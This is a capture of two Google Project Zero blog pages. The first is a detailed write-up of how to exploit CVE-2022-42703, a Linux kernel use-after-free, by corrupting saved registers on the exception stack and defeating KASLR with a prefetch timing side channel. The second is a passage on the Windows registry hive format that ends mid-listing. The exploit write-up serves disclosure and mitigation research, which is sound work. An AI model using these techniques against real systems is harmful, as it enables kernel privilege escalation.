=== Content from googleprojectzero.blogspot.com_2b11ce69_20250115_225528.html ===


# [Project Zero](https://googleprojectzero.blogspot.com/)

News and updates from the Project Zero team at Google

## Thursday, December 8, 2022

### Exploiting CVE-2022-42703 - Bringing back the stack attack

Seth Jenkins, Project Zero

This blog post details an exploit for [CVE-2022-42703](https://bugs.chromium.org/p/project-zero/issues/list?q=label:CVE-2022-42703) (P0 [issue 2351](https://bugs.chromium.org/p/project-zero/issues/detail?id=2351) - Fixed 5 September 2022), a bug Jann Horn found in the Linux kernel's memory management (MM) subsystem that leads to a use-after-free on struct anon\_vma. As the bug is very complex (I certainly struggle to understand it!), a future blog post will describe the bug in full. For the time being, the [issue tracker entry](https://bugs.chromium.org/p/project-zero/issues/detail?id=2351), [this LWN article](https://lwn.net/Articles/383162/) explaining what an anon\_vma is and [the commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7a3ef208e662f) that introduced the bug are great resources in order to gain additional context.

## Setting the scene

Successfully triggering the underlying vulnerability causes folio->mapping to point to a freed anon\_vma object. Calling madvise(..., MADV\_PAGEOUT)can then be used to repeatedly trigger accesses to the freed anon\_vma in folio\_lock\_anon\_vma\_read():

struct anon\_vma \*folio\_lock\_anon\_vma\_read(struct folio \*folio,

       struct rmap\_walk\_control \*rwc)

{

 struct anon\_vma \*anon\_vma = NULL;

 struct anon\_vma \*root\_anon\_vma;

 unsigned long anon\_mapping;

 rcu\_read\_lock();

 anon\_mapping = (unsigned long)READ\_ONCE(folio->mapping);

 if ((anon\_mapping & PAGE\_MAPPING\_FLAGS) != PAGE\_MAPPING\_ANON)

  goto out;

 if (!folio\_mapped(folio))

  goto out;

 // anon\_vma is dangling pointer

 anon\_vma = (struct anon\_vma \*) (anon\_mapping - PAGE\_MAPPING\_ANON);

 // root\_anon\_vma is read from dangling pointer

 root\_anon\_vma = READ\_ONCE(anon\_vma->root);

 if (down\_read\_trylock(&root\_anon\_vma->rwsem)) {

[...]

  if (!folio\_mapped(folio)) { // false

[...]

  }

  goto out;

 }

 if (rwc && rwc->try\_lock) { // true

  anon\_vma = NULL;

  rwc->contended = true;

  goto out;

 }

[...]

out:

 rcu\_read\_unlock();

 return anon\_vma; // return dangling pointer

}

One potential exploit technique is to let the function return the dangling anon\_vma pointer and try to make the subsequent operations do something useful. Instead, we chose to use the down\_read\_trylock() call within the function to corrupt memory at a chosen address, which we can do if we can control the root\_anon\_vma pointer that is read from the freed anon\_vma.

Controlling the root\_anon\_vma pointer means reclaiming the freed anon\_vma with attacker-controlled memory. struct anon\_vma structures are allocated from their own kmalloc cache, which means we cannot simply free one and reclaim it with a different object. Instead we cause the associated anon\_vma slab page to be returned back to the kernel page allocator by following a very similar strategy to the one documented [here](https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html). By freeing all the anon\_vma objects on a slab page, then flushing the percpu slab page partial freelist, we can cause the virtual memory previously associated with the anon\_vma to be returned back to the page allocator. We then spray pipe buffers in order to reclaim the freed anon\_vma with attacker controlled memory.

At this point, we’ve discussed how to turn our use-after-free into a down\_read\_trylock() call on an attacker-controlled pointer. The implementation of down\_read\_trylock() is as follows:

struct rw\_semaphore {

 atomic\_long\_t count;

 atomic\_long\_t owner;

 struct optimistic\_spin\_queue osq; /\* spinner MCS lock \*/

 raw\_spinlock\_t wait\_lock;

 struct list\_head wait\_list;

};

...

static inline int \_\_down\_read\_trylock(struct rw\_semaphore \*sem)

{

 long tmp;

 DEBUG\_RWSEMS\_WARN\_ON(sem->magic != sem, sem);

 tmp = atomic\_long\_read(&sem->count);

 while (!(tmp & RWSEM\_READ\_FAILED\_MASK)) {

  if (atomic\_long\_try\_cmpxchg\_acquire(&sem->count, &tmp,

          tmp + RWSEM\_READER\_BIAS)) {

   rwsem\_set\_reader\_owned(sem);

   return 1;

  }

 }

 return 0;

}

It was helpful to emulate the down\_read\_trylock() in unicorn to determine how it behaves when given different sem->count values. Assuming this code is operating on inert and unchanging memory, it will increment sem->count by 0x100 if the 3 least significant bits and the most significant bit are all unset. That means it is difficult to modify a kernel pointer and we cannot modify any non 8-byte aligned values (as they’ll have one or more of the bottom three bits set). Additionally, this semaphore is later unlocked, causing whatever write we perform to be reverted in the imminent future. Furthermore, at this point we don’t have an established strategy for determining the KASLR slide nor figuring out the addresses of any objects we might want to overwrite with our newfound primitive. It turns out that regardless of any randomization the kernel presently has in place, there’s a straightforward strategy for exploiting this bug even given such a constrained arbitrary write.

## Stack corruption…

On x86-64 Linux, when the CPU performs certain interrupts and exceptions, it will swap to a respective stack that is mapped to a static and non-randomized virtual address, with a different stack for the different exception types. A brief documentation of those stacks and their parent structure, the cpu\_entry\_area, can be found [here.](https://docs.kernel.org/x86/pti.html) These stacks are most often used on entry into the kernel from userland, but they’re used for exceptions that happen in kernel mode as well. We’ve recently seen [KCTF](https://google.github.io/kctf/vrp.html) entries where attackers take advantage of the non-randomized cpu\_entry\_area stacks in order to access data at a known virtual address in kernel accessible memory even in the presence of SMAP and KASLR. You could also use these stacks to forge attacker-controlled data at a known kernel virtual address. This works because the attacker task’s general purpose register contents are pushed directly onto this stack when the switch from userland to kernel mode occurs due to one of these exceptions. This also occurs when the kernel itself generates an Interrupt Stack Table exception and swaps to an exception stack - except in that case, kernel GPR’s are pushed instead. These pushed registers are later used to restore kernel state once the exception is handled. In the case of a userland triggered exception, register contents are restored from the task stack.

One example of an IST exception is a DB exception which can be triggered by an attacker via a hardware breakpoint, the associated registers of which are described [here](https://pdos.csail.mit.edu/6.828/2004/readings/i386/s12_02.htm). Hardware breakpoints can be triggered by a variety of different memory access types, namely reads, writes, and instruction fetches. These hardware breakpoints can be set using ptrace(2), and are preserved during kernel mode execution in a task context such as during a syscall. That means that it’s possible for an attacker-set hardware breakpoint to be triggered in kernel mode, e.g. during a copy\_to/from\_user call. The resulting exception will save and restore the kernel context via the aforementioned non-randomized exception stack, and that kernel context is an exceptionally good target for our arbitrary write primitive.

Any of the registers that copy\_to/from\_user is actively using at the time it handles the hardware breakpoint are corruptible by using our arbitrary-write primitive to overwrite their saved values on the exception stack. In this case, the size of the copy\_user call is the intuitive target. The size value is consistently stored in the rcx register, which will be saved at the same virtual address every time the hardware breakpoint is hit. After corrupting this saved register with our arbitrary write primitive, the kernel will restore rcx from the exception stack once it returns back to copy\_to/from\_user. Since rcx defines the number of bytes copy\_user should copy, this corruption will cause the kernel to illicitly copy too many bytes between userland and the kernel.

## …begets stack corruption

The attack strategy starts as follows:

1. Fork a process Y from process X.
2. Process X ptraces process Y, then sets a hardware breakpoint at a known virtual address [addr] in process Y.
3. Process Y makes a large number of calls to uname(2), which calls copy\_to\_user from a kernel stack buffer to [addr]. This causes the kernel to constantly trigger the hardware watchpoint and enter the DB exception handler, using the DB exception stack to save and restore copy\_to\_user state
4. Simultaneously make many arbitrary writes at the known location of the DB exception stack’s saved rcx value, which is Process Y’s copy\_to\_user’s saved length.

[![DB Exception handling while the arbitrary write primitive writes to the CEA stack leads to corruption of the rcx register](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/w508-h640/image3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/s1111/image3.png)

The DB exception stack is used rarely, so it’s unlikely that we corrupt any unexpected kernel state via a spurious DB exception while spamming our arbitrary write primitive. The technique is also racy, but missing the race simply means corrupting stale stack-data. In that case, we simply try again. In my experience, it rarely takes more than a few seconds to win the race successfully.

Upon successful corruption of the length value, the kernel will copy much of the current task’s stack back to userland, including the task-local stack cookie and return addresses. We can subsequently invert our technique and attack a copy\_from\_user call instead. Instead of copying too many bytes from the kernel task stack to userland, we elicit the kernel to copy too many bytes from userland to the kernel task stack! Again we use a syscall, prctl(2), that performs a copy\_from\_user call to a kernel stack buffer. Now by corrupting the length value, we generate a stack buffer overflow condition in this function where none previously existed. Since we’ve already leaked the stack cookie and the KASLR slide, it is trivially easy to bypass both mitigations and overwrite the return address.

[![Image showing that we’ve gained control of the instruction pointer](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYUmx3piEZB098RyCbjYgbTv18WhcOGwlD3J7HitFqympFWvbVS6iGvsBjdJLgZ5TFc6Y7I4QjugrzV78LCziyAkFMOUgvgDHP_OuPx32gSP5cvrqEV5G2eHqGFzsAHTspIaJ15Dql9ubkcGX6ZQ20NRe9J-cIsLM2y7FEg5CmIICJqoiakOzcYnqT/w640-h420/image2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYUmx3piEZB098RyCbjYgbTv18WhcOGwlD3J7HitFqympFWvbVS6iGvsBjdJLgZ5TFc6Y7I4QjugrzV78LCziyAkFMOUgvgDHP_OuPx32gSP5cvrqEV5G2eHqGFzsAHTspIaJ15Dql9ubkcGX6ZQ20NRe9J-cIsLM2y7FEg5CmIICJqoiakOzcYnqT/s555/image2.png)

Completing a ROP chain for the kernel is left as an exercise to the reader.

## Fetching the KASLR slide with prefetch

Upon reporting this bug to the Linux kernel security team, our suggestion was to start randomizing the location of the percpu cpu\_entry\_area (CEA), and consequently the associated exception and syscall entry stacks. This is an effective mitigation against remote attackers but is insufficient to prevent a local attacker from taking advantage. 6 years ago, Daniel Gruss et al. [discovered a new more reliable technique for exploiting the TLB timing side channel in x86 CPU’s](https://gruss.cc/files/prefetch.pdf). Their results demonstrated that prefetch instructions executed in user mode retired at statistically significant different latencies depending on whether the requested virtual address to be prefetched was mapped vs unmapped, even if that virtual address was only mapped in kernel mode. [kPTI](https://docs.kernel.org/x86/pti.html) was helpful in mitigating this side channel, however, most modern CPUs now have innate protection for Meltdown, which kPTI was specifically designed to address, and thusly kPTI (which has significant performance implications) is disabled on modern microarchitectures. That decision means it is once again possible to take advantage of the prefetch side channel to defeat not only KASLR, but also the CPU entry area randomization mitigation, preserving the viability of the CEA stack corruption exploit technique against modern X86 CPUs.

There are surprisingly few fast and reliable examples of this prefetch KASLR bypass technique available in the open source realm, so I made the decision to write one.

## Implementation

The meat of implementing this technique effectively is in serially reading the processor’s time stamp counter before and after performing a prefetch. [Daniel Gruss helpfully provided highly effective and open source code for doing just that.](https://github.com/IAIK/prefetch) The only edit I made (as suggested by Jann Horn) was to swap to using lfence instead of cpuid as the serializing instruction, as cpuid is emulated in VM environments. It also became apparent in practice that there was no need to perform any cache-flushing routines in order to witness the side-channel effect. It is simply enough to time every prefetch attempt.

Generating prefetch timings for all 512 possible KASLR slots yields quite a bit of fuzzy data in need of analyzing. To minimize noise, multiple samples of each tested address are taken, and the minimum value from that set of samples is used in the results as the representative value for an address. On the Tiger Lake CPU this test was primarily performed on, no more than 16 samples per slot were needed to generate exceptionally reliable results. Low-resolution minimum prefetch time slot identification narrows down the area to search in while avoiding false positives for the higher resolution edge-detection code which finds the precise address at which prefetch dramatically drops in run-time. The result of this effort is a PoC which can correctly identify the KASLR slide on my local machine with 99.999% accuracy (95% accuracy in a VM) while running faster than it takes to grep through kallsyms for the kernel base address:

[![Breaking KASLR with Prefecth: Grepping through kallsyms took .077 seconds while using the prefetch technique took .013 seconds](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE360QpgSL2MstPC7ytC_a22fGUz2uwugoUW0sKHq66aCHk7loOvFCrxAs0ePlNIzvdutTS4wmV5Ilfz2u8MLuQd-n5Z_fSHMcfQdIj-8ooyABpDomHKbxQuCLT3REttBscYj9_F4eGBfKniEm99z4p-ta10N6cXy6nIoGLBV1y8aNn_DiqHBuzVTO/w640-h220/image1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE360QpgSL2MstPC7ytC_a22fGUz2uwugoUW0sKHq66aCHk7loOvFCrxAs0ePlNIzvdutTS4wmV5Ilfz2u8MLuQd-n5Z_fSHMcfQdIj-8ooyABpDomHKbxQuCLT3REttBscYj9_F4eGBfKniEm99z4p-ta10N6cXy6nIoGLBV1y8aNn_DiqHBuzVTO/s891/image1.png)

This prefetch code does indeed work to find the locations of the randomized CEA regions in Peter Ziljstra’s proposed patch. However, the journey to that point results in code that demonstrates another deeply significant issue - KASLR is comprehensively compromised on x86 against local attackers, and has been for the past several years, and will be for the indefinite future. There are presently no plans in place to resolve the myriad microarchitectural issues that lead to side channels like this one. Future work is needed in this area in order to preserve the integrity of KASLR, or alternatively, it is probably time to accept that KASLR is no longer an effective mitigation against local attackers and to develop defensive code and mitigations that accept its limitations.

## Conclusion

This exploit demonstrates a highly reliable and agnostic technique that can allow a broad spectrum of uncontrolled arbitrary write primitives to achieve kernel code execution on x86 platforms. While it is possible to mitigate this exploit technique from a remote context, an attacker in a local context can utilize known microarchitectural side-channels to defeat the current mitigations. Additional work in this area might be valuable to continue to make exploitation more difficult, such as performing in-stack randomization so that the stack offset of the saved state changes on every taken IST exception. For now however, this remains a viable and powerful exploit strategy on x86 Linux.

Posted by

[Google Project Zero](https://www.blogger.com/profile/08975904405228580347 "author profile")

at

[11:04 AM](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4838136820032157985&postID=2515628030502752973&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4838136820032157985&postID=2515628030502752973&target=pinterest "Share to Pinterest")

#### No comments:

#### Post a Comment

[Newer Post](https://googleprojectzero.blogspot.com/2023/01/der-entitlements-brief-return-of.html "Newer Post")

[Older Post](https://googleprojectzero.blogspot.com/2022/11/mind-the-gap.html "Older Post")

[Home](https://googleprojectzero.blogspot.com/)

Subscribe to:
[Post Comments (Atom)](https://googleprojectzero.blogspot.com/feeds/2515628030502752973/comments/default)

## Search This Blog

|  |  |
| --- | --- |

## Pages

* [About Project Zero](https://googleprojectzero.blogspot.com/p/about-project-zero.html)
* [Working at Project Zero](https://googleprojectzero.blogspot.com/p/working-at-project-zero.html)
* [0day "In the Wild"](https://googleprojectzero.blogspot.com/p/0day.html)
* [0day Exploit Root Cause Analyses](https://googleprojectzero.github.io/0days-in-the-wild/rca.html)
* [Vulnerability Disclosure FAQ](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html)

## Archives

* ►
  [2024](https://googleprojectzero.blogspot.com/2024/)
  (12)
  + ►
    [December](https://googleprojectzero.blogspot.com/2024/12/)
    (3)
  + ►
    [November](https://googleprojectzero.blogspot.com/2024/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2024/10/)
    (2)
  + ►
    [June](https://googleprojectzero.blogspot.com/2024/06/)
    (3)
  + ►
    [April](https://googleprojectzero.blogspot.com/2024/04/)
    (2)

* ►
  [2023](https://googleprojectzero.blogspot.com/2023/)
  (11)
  + ►
    [November](https://googleprojectzero.blogspot.com/2023/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2023/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2023/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2023/08/)
    (4)
  + ►
    [April](https://googleprojectzero.blogspot.com/2023/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2023/03/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2023/01/)
    (2)

* ▼
  [2022](https://googleprojectzero.blogspot.com/2022/)
  (17)
  + ▼
    [December](https://googleprojectzero.blogspot.com/2022/12/)
    (1)
    - [Exploiting CVE-2022-42703 - Bringing back the stac...](https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html)
  + ►
    [November](https://googleprojectzero.blogspot.com/2022/11/)
    (3)
  + ►
    [October](https://googleprojectzero.blogspot.com/2022/10/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2022/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2022/06/)
    (3)
  + ►
    [May](https://googleprojectzero.blogspot.com/2022/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2022/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2022/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2022/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2022/01/)
    (1)

* ►
  [2021](https://googleprojectzero.blogspot.com/2021/)
  (24)
  + ►
    [December](https://googleprojectzero.blogspot.com/2021/12/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2021/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2021/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2021/08/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2021/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2021/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2021/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2021/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2021/02/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2021/01/)
    (10)

* ►
  [2020](https://googleprojectzero.blogspot.com/2020/)
  (36)
  + ►
    [December](https://googleprojectzero.blogspot.com/2020/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2020/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2020/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2020/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2020/08/)
    (5)
  + ►
    [July](https://googleprojectzero.blogspot.com/2020/07/)
    (8)
  + ►
    [June](https://googleprojectzero.blogspot.com/2020/06/)
    (2)
  + ►
    [April](https://googleprojectzero.blogspot.com/2020/04/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2020/02/)
    (4)
  + ►
    [January](https://googleprojectzero.blogspot.com/2020/01/)
    (5)

* ►
  [2019](https://googleprojectzero.blogspot.com/2019/)
  (27)
  + ►
    [December](https://googleprojectzero.blogspot.com/2019/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2019/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2019/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2019/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2019/08/)
    (11)
  + ►
    [May](https://googleprojectzero.blogspot.com/2019/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2019/04/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2019/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2019/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2019/01/)
    (2)

* ►
  [2018](https://googleprojectzero.blogspot.com/2018/)
  (22)
  + ►
    [December](https://googleprojectzero.blogspot.com/2018/12/)
    (7)
  + ►
    [November](https://googleprojectzero.blogspot.com/2018/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2018/10/)
    (4)
  + ►
    [September](https://googleprojectzero.blogspot.com/2018/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2018/08/)
    (3)
  + ►
    [July](https://googleprojectzero.blogspot.com/2018/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2018/06/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2018/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2018/04/)
    (1)
  + ►
    [January](https://googleprojectzero.blogspot.com/2018/01/)
    (1)

* ►
  [2017](https://googleprojectzero.blogspot.com/2017/)
  (19)
  + ►
    [December](https://googleprojectzero.blogspot.com/2017/12/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2017/10/)
    (3)
  + ►
    [September](https://googleprojectzero.blogspot.com/2017/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2017/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2017/07/)
    (1)
  + ►
    [May](https://googleprojectzero.blogspot.com/2017/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2017/04/)
    (6)
  + ►
    [March](https://googleprojectzero.blogspot.com/2017/03/)
    (1)
  + ►
    [February](https://googleprojectzero.blogspot.com/2017/02/)
    (2)

* ►
  [2016](https://googleprojectzero.blogspot.com/2016/)
  (17)
  + ►
    [December](https://googleprojectzero.blogspot.com/2016/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2016/11/)
    (1)
  + ►
    [October](https://googleprojectzero.blogspot.com/2016/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2016/09/)
    (2)
  + ►
    [August](https://googleprojectzero.blogspot.com/2016/08/)
    (1)
  + ►
    [July](https://googleprojectzero.blogspot.com/2016/07/)
    (1)
  + ►
    [June](https://googleprojectzero.blogspot.com/2016/06/)
    (3)
  + ►
    [March](https://googleprojectzero.blogspot.com/2016/03/)
    (3)
  + ►
    [February](https://googleprojectzero.blogspot.com/2016/02/)
    (2)
  + ►
    [January](https://googleprojectzero.blogspot.com/2016/01/)
    (1)

* ►
  [2015](https://googleprojectzero.blogspot.com/2015/)
  (33)
  + ►
    [December](https://googleprojectzero.blogspot.com/2015/12/)
    (2)
  + ►
    [November](https://googleprojectzero.blogspot.com/2015/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2015/10/)
    (1)
  + ►
    [September](https://googleprojectzero.blogspot.com/2015/09/)
    (4)
  + ►
    [August](https://googleprojectzero.blogspot.com/2015/08/)
    (6)
  + ►
    [July](https://googleprojectzero.blogspot.com/2015/07/)
    (5)
  + ►
    [June](https://googleprojectzero.blogspot.com/2015/06/)
    (4)
  + ►
    [May](https://googleprojectzero.blogspot.com/2015/05/)
    (1)
  + ►
    [April](https://googleprojectzero.blogspot.com/2015/04/)
    (1)
  + ►
    [March](https://googleprojectzero.blogspot.com/2015/03/)
    (2)
  + ►
    [February](https://googleprojectzero.blogspot.com/2015/02/)
    (3)
  + ►
    [January](https://googleprojectzero.blogspot.com/2015/01/)
    (2)

* ►
  [2014](https://googleprojectzero.blogspot.com/2014/)
  (11)
  + ►
    [December](https://googleprojectzero.blogspot.com/2014/12/)
    (1)
  + ►
    [November](https://googleprojectzero.blogspot.com/2014/11/)
    (2)
  + ►
    [October](https://googleprojectzero.blogspot.com/2014/10/)
    (2)
  + ►
    [September](https://googleprojectzero.blogspot.com/2014/09/)
    (1)
  + ►
    [August](https://googleprojectzero.blogspot.com/2014/08/)
    (2)
  + ►
    [July](https://googleprojectzero.blogspot.com/2014/07/)
    (3)

|  |  |
| --- | --- |

|  |  |
| --- | --- |

Powered by [Blogger](https://www.blogger.com).



=== Content from googleprojectzero.blogspot.com_8d3d6852_20250115_225530.html ===


# Project Zero

News and updates from the Project Zero team at Google

## Thursday, December 19, 2024

### [The Windows Registry Adventure #5: The regf file format](https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html)

Posted by Mateusz Jurczyk, Google Project Zero

As previously mentioned in the second installment of the blog post series (["A brief history of the feature"](https://googleprojectzero.blogspot.com/2024/04/the-windows-registry-adventure-2.html)), the binary format used to encode registry hives from Windows NT 3.1 up to the modern Windows 11 is called regf. In a way, it is quite special, because it represents a registry subtree simultaneously on disk and in memory, as opposed to most other common file formats. Documents, images, videos, etc. are generally designed to store data efficiently on disk, and they are subsequently parsed to and from different in-memory representations whenever they are read or written. This seems only natural, as offline storage and RAM come with different constraints and requirements. On disk, it is important that the data is packed as tightly as possible, while in memory, easy and efficient random access is typically prioritized. The regf format aims to bypass the reparsing step – likely to optimize the memory/disk synchronization process – and reconcile the two types of data encodings into a single one that is both relatively compact and easy to operate on at the same time. This explains, for instance, why hives don't natively support compression (but the clients are of course free to store compressed data in the registry). This unique approach comes with its own set of challenges, and has been a contributing factor in a number of historical vulnerabilities.

Throughout the 30 years of the format's existence, Microsoft has never released its official specification. However, the data layout of all of the building blocks making up a hive (file header, bin headers, cell structures) are effectively public through the PDB symbols for the Windows kernel image (ntoskrnl.exe) available on the [Microsoft Symbol Server](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/microsoft-public-symbols). Furthermore, the Windows Internals book series also includes a section that delves into the specifics of the regf format (named Hive structure). Lastly, forensics experts have long expressed interest in the format for analysis purposes, resulting in the creation of several unofficial specifications based on reverse engineering, experimentation and deduction. These sources have been listed in my earlier [Learning resources](https://googleprojectzero.blogspot.com/2024/06/the-windows-registry-adventure-3.html) blog post; the two most extensive specifications of this kind can be found [here](https://github.com/libyal/libregf/blob/main/documentation/Windows%2520NT%2520Registry%2520File%2520%28REGF%29%2520format.asciidoc) and [here](https://github.com/msuhanov/regf/blob/master/Windows%2520registry%2520file%2520format%2520specification.md). The intent of this post is not to repeat the information compiled in the existing resources, but rather to highlight specific parts of the format that have major relevance to security, or provide some extra context where I found it missing. A deep understanding of the low-level regf format will prove invaluable in grasping many of the higher-level concepts in the registry, as well as the technical details of software bugs discussed in future blog posts.

## The hive structure: header, bins and cells

On the lowest level, data in hives is organized in chunks of 4 KiB (0x1000 bytes), incidentally the size of a standard memory page in the x86 architecture. The first 4 KiB always correspond to the header (also called the base block), followed by one or more bins, each being a multiple of 4 KiB in length. The header specifies general information about the hive (signature, version, etc.), while bins are an abstraction layer designed to enable the fragmentation of hive mappings in virtual memory – more on that later.

Each bin starts with a 32-byte (0x20) header, followed by one or more cells that completely fill the bin. A cell is the smallest unit of data in a hive that has a specific purpose (e.g. describes a key, value, security descriptor, and so on). The data of a cell is preceded by a 32-bit integer specifying its size, which must be a multiple of eight (i.e. its three least significant bits are clear), and is either in the free or allocated state. A free (unused) cell is indicated by a positive size, and an allocated cell is indicated by a negative one. For example, a free cell of 32 bytes has a length marker of 0x00000020, while an active cell of 128 bytes has its size encoded as 0xFFFFFF80. This visibly demonstrates the hybrid on-disk / in-memory nature of the hive format as opposed to other classic formats, which don't intentionally leave large chunks of unused space in the files.

The overall file structure is illustrated in the diagram below:

[![Pictoral representation of the overall file structure](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQtJm0XNkozXGxjQnB9n1ka9OuxP7lrLSQN1KZF-Zc60Z06dBEz3AAA8aAYnmdrU4imLebCFvF6qXaE0h-uA_iXnuyAisG90JWawSAMPPaToLdXMGeC4FlyGz42FWkf1bPhJmwSez8Ot-DLI29n4jinIXswZ-LQoLyWX7PIKVF5EwkRoAXNUFYIdcCOwo/s1200/image8.png "Pictoral representation of the overall file structure")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQtJm0XNkozXGxjQnB9n1ka9OuxP7lrLSQN1KZF-Zc60Z06dBEz3AAA8aAYnmdrU4imLebCFvF6qXaE0h-uA_iXnuyAisG90JWawSAMPPaToLdXMGeC4FlyGz42FWkf1bPhJmwSez8Ot-DLI29n4jinIXswZ-LQoLyWX7PIKVF5EwkRoAXNUFYIdcCOwo/s1999/image8.png)

In the Windows kernel, internal functions responsible for handling these low-level hive objects (base block, bins, cells) have names starting with "Hv", for example HvCheckHive, HvpAllocateBin or HvpViewMapCleanup. This part of the registry codebase is crucial as it forms the foundation of the registry logic, enabling the Configuration Manager to easily allocate, free, and access hive cells without concerning itself with the technical details of memory management. It is also a place with significant potential for optimizations, such as the incremental logging added in Windows 8.1, or section-based registry introduced in Windows 10 April 2018 Update (RS4). Both of these mechanisms are well described in the Windows Internals 7 (Part 2) book.

While integral to the correct functioning of the registry, hive management does not constitute a very large part of the overall registry-related codebase. In my analysis of the registry code growth shown in blog post #2, I counted 100,007 decompiled lines of code corresponding to this subsystem in Windows 11 kernel build 10.0.22621.2134. Out of these, only 10,407 or around 10.4% correspond to hive memory management. This is also reflected in my findings: out of the 52 CVEs assigned by Microsoft, only two of them were directly related to a Hv\* function implementation – [CVE-2022-37988](https://project-zero.issues.chromium.org/issues/42451463), a logic bug in HvReallocateCell leading to memory corruption, and [CVE-2024-43452](https://project-zero.issues.chromium.org/issues/42451731), a double-fetch while loading hives from remote network shares. This is not to say that there aren't more bugs in this mechanism, but their quantity is likely proportional to its size relative to the rest of the registry-related code.

Let's now have a closer look at how each of the basic objects in the hive are encoded and what information they store, starting with the base block.

### Base block

The base block is represented by a structure called \_HBASE\_BLOCK in the Windows Kernel, and its layout can be displayed in WinDbg:

0: kd> dt \_HBASE\_BLOCK

nt!\_HBASE\_BLOCK

   +0x000 Signature        : Uint4B

   +0x004 Sequence1        : Uint4B

   +0x008 Sequence2        : Uint4B

   +0x00c TimeStamp        : \_LARGE\_INTEGER

